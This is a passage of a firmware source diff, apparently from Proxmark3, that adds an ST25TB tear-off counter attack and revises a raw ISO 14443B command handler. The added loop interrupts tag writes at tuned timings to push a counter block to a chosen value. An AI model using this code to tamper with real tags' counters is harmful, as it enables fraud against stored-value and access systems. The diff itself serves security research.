+        reply_ng(CMD_HF_ISO14443B_ST25TB_TEAROFF, PM3_ESOFT, NULL, 0);
+        tearoff_exit();
+        return;
+    }
+
+    tear_off_value = tearoff_next_value(current_value, false);
+
+    Dbprintf("");
+    Dbprintf(_CYAN_("ST25TB Tear-off counter attack"));
+    Dbprintf("------------------------------");
+    Dbprintf(" Target block: %d", block_address);
+    Dbprintf("Current value: 0x%08X", current_value);
+    Dbprintf(" Target value: 0x%08X", target_value);
+    Dbprintf(" Safety value: 0x%08X", safety_value);
+    Dbprintf("Adjustment us: %u", tear_off_adjustment_us);
+    Dbprintf("");
+
+    if (current_value == target_value) {
+        Dbprintf(_GREEN_("Current value already matches target."));
+        reply_ng(CMD_HF_ISO14443B_ST25TB_TEAROFF, PM3_SUCCESS, (uint8_t *)&current_value, sizeof(current_value));
+        tearoff_exit();
+        return;
+    }
+
+    if (tear_off_value == 0 && current_value != 0) {
+        Dbprintf("Tear-off technique not possible from current value.");
+        reply_ng(CMD_HF_ISO14443B_ST25TB_TEAROFF, PM3_ESOFT, NULL, 0);
+        tearoff_exit();
+        return;
+    }
+
+    // Main tear-off loop
+    uint32_t loop_count = 0;
+    int consecutive_read_fails = 0;
+
+    for (;;) {
+        WDT_HIT();
+        loop_count++;
+
+        // Send WTX keepalive every ~500 iterations to prevent USB timeout
+        // Each iteration takes ~1-10ms (select + write + read), so this
+        // fires roughly every 1-5 seconds. We request 10s extension each time.
+        if ((loop_count % 500) == 0) {
+            send_wtx(10000);
+        }
+
+        // Check for user abort (button press or USB data)
+        if (BUTTON_PRESS() || data_available()) {
+            Dbprintf("Tear-off stopped by user.");
+            reply_ng(CMD_HF_ISO14443B_ST25TB_TEAROFF, PM3_EOPABORTED, (uint8_t *)&current_value, sizeof(current_value));
+            tearoff_exit();
+            return;
+        }
+
+        // Safety check
+        if (tear_off_value < safety_value) {
+            Dbprintf("Stopped. Safety threshold reached (next value 0x%08X < safety 0x%08X)",
+                     tear_off_value, safety_value);
+            reply_ng(CMD_HF_ISO14443B_ST25TB_TEAROFF, PM3_ESOFT, (uint8_t *)&current_value, sizeof(current_value));
+            tearoff_exit();
+            return;
+        }
+
+        // Perform tear-off write attempt
+        tearoff_write_block(block_address, tear_off_value, tear_off_us);
+
+        // Read back
+        result = tearoff_read_block(block_address, &read_value);
+        if (result != 0) {
+            consecutive_read_fails++;
+            if (consecutive_read_fails > 30) {
+                Dbprintf("Read failed %d times consecutively. Is the tag present?", consecutive_read_fails);
+                reply_ng(CMD_HF_ISO14443B_ST25TB_TEAROFF, PM3_ESOFT, (uint8_t *)&current_value, sizeof(current_value));
+                tearoff_exit();
+                return;
+            }
+            tear_off_us++;
+            continue; // Retry if read fails
+        }
+        consecutive_read_fails = 0;
+
+        // Analyze result
+        if (read_value > current_value) {
+            // Partial write success (tear-off glitch worked)
+            if (read_value >= 0xFFFFFFFE ||
+                    (read_value - 2) > target_value ||
+                    read_value != last_consolidated_value ||
+                    ((read_value & 0xF0000000) > (current_value & 0xF0000000))) {
+
+                result = tearoff_consolidate_block(block_address, read_value,
+                                                   target_value, &current_value);
+                if (result == 0 && current_value == target_value) {
+                    tearoff_log(tear_off_us, "\033[32m", read_value);
+                    Dbprintf("");
+                    Dbprintf(_GREEN_("Target value 0x%08X reached successfully!"), target_value);
+                    reply_ng(CMD_HF_ISO14443B_ST25TB_TEAROFF, PM3_SUCCESS, (uint8_t *)&current_value, sizeof(current_value));
+                    tearoff_exit();
+                    return;
+                }
+                if (read_value != last_consolidated_value) {
+                    tearoff_adjust_timing(&tear_off_us, tear_off_adjustment_us);
+                }
+                last_consolidated_value = read_value;
+                tear_off_value = tearoff_next_value(current_value, false);
+                trigger = true;
+                tearoff_log(tear_off_us, "\033[32m", read_value);
+            }
+        } else if (read_value == tear_off_value) {
+            // Full write went through (no tear-off effect)
+            if (trigger) {
+                tear_off_value = tearoff_next_value(tear_off_value, true);
+                trigger = false;
+            } else {
+                tear_off_value = tearoff_next_value(read_value, false);
+                trigger = true;
+            }
+            current_value = read_value;
+            tearoff_adjust_timing(&tear_off_us, tear_off_adjustment_us);
+            tearoff_log(tear_off_us, "\033[34m", read_value);
+        } else if (read_value < tear_off_value) {
+            // Partial write but went lower
+            tear_off_value = tearoff_next_value(read_value, false);
+            tearoff_adjust_timing(&tear_off_us, tear_off_adjustment_us);
+            current_value = read_value;
+            trigger = true;
+            tearoff_log(tear_off_us, "\033[31m", read_value);
+        }
+
+        // Increment timing for next attempt
+        tear_off_us++;
+    }
+}
+
+
 void SendRawCommand14443B(iso14b_raw_cmd_t *p) {
 
     // turn on trigger (LED_A)
@@ -2558,13 +3096,14 @@ void SendRawCommand14443B(iso14b_raw_cmd_t *p) {
 
     if ((p->flags & ISO14B_CLEARTRACE) == ISO14B_CLEARTRACE) {
         clear_trace();
-        BigBuf_Clear_ext(false);
     }
 
     set_tracing(true);
 
-    // receive buffer
-    uint8_t buf[PM3_CMD_DATA_SIZE] = {0x00};
+    // receive buffer — sized for APDU response header + max payload, reused for all paths
+    uint8_t buf[sizeof(iso14b_raw_apdu_response_t) + PM3_CMD_DATA_SIZE];
+    memset(buf, 0, sizeof(buf));
+    iso14b_raw_apdu_response_t *payload = (iso14b_raw_apdu_response_t *)buf;
 
     int status = 0;
     uint32_t sendlen = sizeof(iso14b_card_select_t);
@@ -2626,17 +3165,14 @@ void SendRawCommand14443B(iso14b_raw_cmd_t *p) {
         uint16_t responselen = 0;
         uint8_t response_byte = 0;
         bool chaining = ((p->flags & ISO14B_SEND_CHAINING) == ISO14B_SEND_CHAINING);
-        status = iso14443b_apdu(p->raw, p->rawlen, chaining, buf, sizeof(buf), &response_byte, &responselen);
+        status = iso14443b_apdu(p->raw, p->rawlen, chaining, payload->data, PM3_CMD_DATA_SIZE, &response_byte, &responselen);
 
         if (tearoff_hook() == PM3_ETEAROFF) { // tearoff occurred
             reply_ng(CMD_HF_ISO14443B_COMMAND, PM3_ETEAROFF, NULL, 0);
         } else {
-            uint8_t packet[responselen + 1 + 2];
-            iso14b_raw_apdu_response_t *payload = (iso14b_raw_apdu_response_t *)packet;
             payload->response_byte = response_byte;
             payload->datalen = responselen;
-            memcpy(payload->data, buf, payload->datalen);
-            reply_ng(CMD_HF_ISO14443B_COMMAND, status, packet, sizeof(packet));
+            reply_ng(CMD_HF_ISO14443B_COMMAND, status, buf, sizeof(iso14b_raw_apdu_response_t) + responselen);
         }
     }
 
@@ -2665,7 +3201,7 @@ void SendRawCommand14443B(iso14b_raw_cmd_t *p) {
             eof_time += DELAY_ISO14443B_PCD_TO_PICC_READER;
 
             uint16_t retlen = 0;
-            status = Get14443bAnswerFromTag(buf, sizeof(buf), s_iso14b_timeout, &eof_time, &retlen);
+            status = Get14443bAnswerFromTag(buf, PM3_CMD_DATA_SIZE, s_iso14b_timeout, &eof_time, &retlen);
             if (status == PM3_SUCCESS) {
                 sendlen = MIN(retlen, PM3_CMD_DATA_SIZE);
                 reply_ng(CMD_HF_ISO14443B_COMMAND, status, Demod.output, sendlen);
